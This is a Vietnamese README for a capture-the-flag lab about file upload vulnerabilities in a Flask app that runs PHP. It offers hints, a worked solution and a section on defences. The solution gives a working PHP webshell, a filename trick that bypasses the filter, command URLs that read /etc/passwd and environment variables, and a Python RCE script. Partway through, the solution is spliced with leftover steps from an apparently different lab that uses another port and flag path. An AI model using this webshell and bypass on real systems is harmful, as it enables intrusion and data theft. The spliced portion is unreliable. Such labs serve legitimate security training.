# File Upload Vulnerability Lab - CTF Challenge

Lab luyện tập khai thác lỗ hổng File Upload với khả năng thực thi file PHP. Ứng dụng Flask cho phép upload file PHP và thực thi chúng thông qua PHP-CGI, tạo điều kiện cho Remote Code Execution (RCE).

**Flag format:** `FLAG{...}`

## Mục tiêu

Upload PHP webshell và sử dụng RCE để tìm và đọc flag trên server.

## Cài đặt và Chạy Lab

### Yêu cầu
- Docker
- Docker Compose

### Khởi chạy

1. Build và chạy container:
```bash
docker-compose up -d --build
```

2. Truy cập ứng dụng tại: `http://localhost:5006`

3. Dừng container:
```bash
docker-compose down
```

## Hints 

<details>
<summary>Hint 1: Loại lỗ hổng</summary>

Ứng dụng có bộ lọc không cho upload file .php. Tuy nhiên, bộ lọc này có thể bypass được.

</details>

<details>
<summary>Hint 2: Bypass Filter</summary>

Server lọc bằng cách xóa `.php` khỏi tên file. Hãy thử nghĩ cách đặt tên file sao cho sau khi bị xóa `.php` vẫn còn `.php`.

Ví dụ: Nếu server xóa `.php` từ `shell.p.phphp`, kết quả sẽ là gì?

</details>

<details>
<summary>Hint 3: PHP Webshell</summary>

Tạo file `shell.p.phphp` với nội dung:
```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
```

</details>

<details>
<summary>Hint 4: Thực thi lệnh</summary>

Sau khi upload file `shell.p.phphp`, nó sẽ được lưu với tên `shell.php` (sau khi bị xóa `.php`).
Truy cập file PHP với parameter `cmd`:
`http://localhost:5006/uploads/shell.php?cmd=ls`

</details>

<details>
<summary>Hint 5: Tìm flag</summary>

Flag được lưu trong file `/app/flag.txt`. Sử dụng lệnh hệ thống để tìm và đọc nó:
- `find / -name "*flag*"` để tìm file
- `cat /app/flag.txt` để đọc nội dung

</details>

## Solution 

<details>
<summary>Click để xem lời giải chi tiết</summary>

### Phân tích lỗ hổng

1. **Blacklist Extension Filter**: Ứng dụng cố gắng chặn file .php bằng cách xóa `.php` khỏi tên file
2. **Bypass Filter**: Sử dụng double extension `shell.p.phphp` → sau khi xóa `.php` → thành `shell.php`
3. **Server thực thi PHP**: Flask app sử dụng PHP-CGI để thực thi file PHP đã upload
4. **RCE qua PHP**: Có thể chạy system commands thông qua PHP webshell

### Các bước khai thác

**Bước 1: Tạo PHP Webshell**

Tạo file `shell.p.phphp` với nội dung:
```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
```

**Bước 2: Upload file**

1. Mở http://localhost:5006
2. Chọn file `shell.p.phphp` 
3. Click "Upload File"
4. File sẽ được lưu thành `shell.php` (sau khi filter xóa `.php`)

**Bước 3: Thực thi lệnh**

Truy cập webshell với parameter `cmd`:

1. Liệt kê thư mục hiện tại:
```
http://localhost:5006/uploads/shell.php?cmd=ls
```

2. Tìm file flag:
```
http://localhost:5006/uploads/shell.php?cmd=find%20/%20-name%20%22*flag*%22%202%3E/dev/null
```

3. Đọc flag:
```
http://localhost:5006/uploads/shell.php?cmd=cat%20/app/flag.txt
```

**Các lệnh hữu ích:**
- `whoami` - Xem user hiện tại
- `pwd` - Xem thư mục hiện tại
- `ls -la` - Liệt kê file chi tiết
- `cat /etc/passwd` - Đọc file hệ thống
- `env` - Xem biến môi trường

### Flag

`FLAG{upl0ad_php_sh3ll_and_rc3_1s_fun!}`
```

2. Upload file `shell.py` qua giao diện web

3. Truy cập: `http://localhost:5000/uploads/shell.py`

**Cách 2: Upload file RCE đơn giản**

1. Tạo file `rce.py`:
```python
import subprocess
import sys

print("Content-Type: text/html\n")
print("<html><body>")
print("<h2>Remote Code Execution</h2>")

# Tìm flag file
result = subprocess.run(['find', '/', '-name', '*flag*'], 
                       capture_output=True, text=True, timeout=5)
print("<h3>Files with 'flag' in name:</h3>")
print("<pre>" + result.stdout + "</pre>")

# Đọc flag
result = subprocess.run(['cat', '/tmp/flag.txt'], 
                       capture_output=True, text=True)
print("<h3>Flag content:</h3>")
print("<pre>" + result.stdout + "</pre>")

print("</body></html>")
```

2. Upload và truy cập file

**Cách 3: Path Traversal (nếu có)**

Thử upload file với tên như `../../tmp/test.py` để ghi file vào vị trí khác.

### Flag

`FLAG{upl0ad_php_sh3ll_and_rc3_1s_fun!}`

</details>

## Bảo vệ chống lỗ hổng File Upload

Để bảo vệ ứng dụng khỏi lỗ hổng này:

1. **Whitelist extension**: Chỉ cho phép một số extension cụ thể
```python
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```

2. **Sử dụng secure_filename**: Sanitize tên file
```python
from werkzeug.utils import secure_filename
filename = secure_filename(file.filename)
```

3. **Lưu file ngoài webroot**: Không cho phép trực tiếp truy cập file đã upload

4. **Kiểm tra content type**: Xác thực loại file thực sự, không chỉ dựa vào extension

5. **Scan malware**: Quét file upload tìm malware

6. **Giới hạn kích thước**: Hạn chế dung lượng file upload

7. **Rename file**: Đổi tên file upload thành random string

